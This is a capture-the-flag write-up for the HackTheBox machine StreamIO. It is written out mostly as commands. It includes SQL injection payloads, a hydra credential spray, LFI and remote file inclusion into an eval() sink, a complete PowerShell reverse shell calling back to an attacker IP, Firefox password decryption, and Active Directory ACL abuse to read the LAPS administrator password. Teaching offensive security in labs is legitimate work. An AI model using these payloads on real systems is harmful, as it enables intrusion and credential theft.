# Streamio — HackTheBox Writeup

"StreamIO is a medium machine that covers subdomain enumeration leading to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we leverage the SQLCMD command line utility to enumerate databases and obtain further credentials used in lateral movement. As the secondary user we use `WinPEAS` to enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials within BloodHound we discover that the user has the ability to add themselves to a specific group in which they can read LDAP secrets. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the `Core Staff` group, then access LDAP to disclose the administrator LAPS password."

---

## Attack Chain

```
SQLi (watch.streamio.htb) → Hash Cracking → Credential Spray → Admin Panel
→ LFI (debug param) → Source Code Read → RCE via eval() → Shell (yoshihide)
→ MSSQL Enum (streamio_backup) → nikk37 → Firefox Creds Decrypt
→ JDgodd → BloodHound → WriteOwner → CORE STAFF → ReadLAPSPassword → Administrator
```

---

## 1. Reconnaissance

### Port Scan

```bash
rustscan -a 10.129.35.207 -u 5000 -b 2000 -- -sCV
```

Relevant open ports:

| Port | Service | Notes                            |
| ---- | ------- | -------------------------------- |
| 443  | HTTPS   | streamio.htb, watch.streamio.htb |
| 5985 | WinRM   | Evil-WinRM access later          |

Clock skew detected — sync before any work:

```bash
ntpdate -u 10.129.35.207
```

### Host Setup

```bash
echo "10.129.35.207 streamio.htb watch.streamio.htb dc.streamio.htb" | tee -a /etc/hosts
```

---

## 2. SQL Injection — watch.streamio.htb/search.php

### Discovery

The search bar on `watch.streamio.htb` was vulnerable to sqli!
sqlmap was blocked by a WAF (`blocked.php`), so manual exploitation was required.

Testing injection characters:

```
'        → No result
';-- -   → Result returned  ← vulnerable
```

### Column Enumeration

```sql
test' UNION SELECT 1,2,3,4,5,6;-- -
```

Result: columns 2 and 3 are reflected. DB fingerprint:

```sql
test' UNION SELECT 1,@@version,3,4,5,6;-- -
-- Microsoft SQL Server confirmed
```

### Data Extraction

```sql
-- List columns
test' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_name='users';-- -

-- Dump usernames
test' UNION SELECT 1,username,3,4,5,6 FROM users;-- -

-- Dump passwords
test' UNION SELECT 1,password,3,4,5,6 FROM users;-- -
```

31 user:MD5 pairs extracted. Cracked 14 with hashcat:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --user
```

Key hits:

```
yoshihide : !!sabrina$
Lauren    : $3xybitch
James     : $hadoW
Diablo    : highschoolmusical
Stan      : (empty string)
```

---

## 3. Admin Panel Access

### Credential Spray

No direct login worked. Cross-sprayed all recovered usernames against all recovered passwords:

```bash
hydra -L users.txt -P passwords.txt streamio.htb https-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

Hit: `yoshihide : !!sabrina$` on `streamio.htb/login.php`

### Admin Panel Enumeration

After login, `/admin/` exposed four sections via GET parameters:

```
?user=    ?staff=    ?movie=    ?message=
```

Parameter fuzzing with ffuf discovered an undocumented `debug` parameter. Testing it:

```
https://streamio.htb/admin/?debug=master.php
```

Response included the master.php content — LFI confirmed. Source read via PHP filter:

```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

```bash
cat encoded.txt | base64 -d
```

---

## 4. Remote Code Execution

### Source Code Findings

**index.php** — hardcoded DB credentials:

```
DB: STREAMIO  |  User: db_admin  |  Pass: B1@hx31234567890
```

Also sets `define('included', true)` — the guard that master.php checks.

**master.php** — unauthenticated eval() sink:

```php
if(isset($_POST['include']))
{
    if($_POST['include'] !== "index.php")
        eval(file_get_contents($_POST['include']));
}
```

No sanitization. The `included` constant check is bypassed by routing through `?debug=master.php` since index.php defines it first.

### Code Execution Confirmed

`shell.php` — no `<?php` tags, eval() expects raw PHP:

```php
echo shell_exec('whoami');
```

Request:

```
POST /admin/?debug=master.php HTTP/1.1
Host: streamio.htb
Cookie: PHPSESSID=<session>
Content-Type: application/x-www-form-urlencoded

include=http://10.10.17.44:8000/shell.php
```

Response contains `streamio\yoshihide`.

### Reverse Shell

Outbound HTTP worked. PowerShell reverse shell in `shell.php` (no `<?php` tag):

```php
$cmd = "powershell -nop -w hidden -e <BASE64_ENCODED_REVSHELL>";
echo shell_exec($cmd);
```

The base64 payload decodes to:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.17.44",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Listener:

```bash
rlwrap nc -lvnp 4444
```

Shell as `streamio\yoshihide`.

---

## 5. Lateral Movement — nikk37

### MSSQL Enumeration

Using the hardcoded creds from source:

```bash
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q "SELECT name FROM master.dbo.sysdatabases"
```

Additional database found: `streamio_backup`. Querying its users table:

```bash
sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -Q "SELECT * FROM streamio_backup.dbo.users"
```

New account: `nikk37 : 389d14cb8e4e9b94b137deb1caf0612a`

Cracked: `nikk37 : get_dem_girls2@yahoo.com`

### Evil-WinRM as nikk37

```bash
evil-winrm -i 10.129.35.207 -u nikk37 -p 'get_dem_girls2@yahoo.com'
```

**User flag:** `C:\Users\nikk37\Desktop\user.txt`

---

## 6. Firefox Credential Extraction

### Discovery

Nikk37's Firefox profile contained saved passwords:

```
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\
  logins.json
  key4.db
```

### Decryption

Downloaded both files via Evil-WinRM's built-in download feature, then decrypted locally:

```bash
python3 firepwd.py -d /root/nikkdir
```

Four credentials recovered for `slack.streamio.htb`:

```
admin     : JDg0dd1s@d0p3cr3@t0r
nikk37    : n1kk1sd0p3t00:)
yoshihide : paddpadd@12
JDgodd    : password@12
```

Password spray confirmed: `JDgodd : JDg0dd1s@d0p3cr3@t0r` is a valid domain account.

---

## 7. Active Directory — LAPS Abuse

### BloodHound

```bash
bloodhound-python -c ALL -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' \
  -d streamIO.htb -ns 10.129.35.207 --zip
```

Attack path identified:

```
JDGODD --[Owns / WriteOwner]--> CORE STAFF --[ReadLAPSPassword]--> DC
```
<img width="683" height="530" alt="image" src="https://github.com/user-attachments/assets/a5cd2834-e793-4ce4-a56d-4b48d351af47" />

---



JDgodd owns CORE STAFF, meaning full DACL control. CORE STAFF can read the LAPS-managed local Administrator password from the DC.

### ACL Abuse Chain

**Step 1** — Grant GenericAll on CORE STAFF to JDgodd (owner privilege):

```bash
bloodyAD --host 10.129.35.207 -d streamIO.htb \
  -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' \
  add genericAll "CORE STAFF" JDgodd
```

**Step 2** — Add JDgodd to CORE STAFF:

```bash
bloodyAD --host 10.129.35.207 -d streamIO.htb \
  -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' \
  add groupMember "CORE STAFF" JDgodd
```

**Step 3** — Read LAPS password:

```bash
netexec ldap 10.129.35.207 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -M laps
```

Result: `Administrator : Oa2H4]OiFXtq[$`

### Administrator

```bash
evil-winrm -i 10.129.35.207 -u Administrator -p 'Oa2H4]OiFXtq[$'
```

**Root flag:** `C:\Users\Martin\Desktop\root.txt`
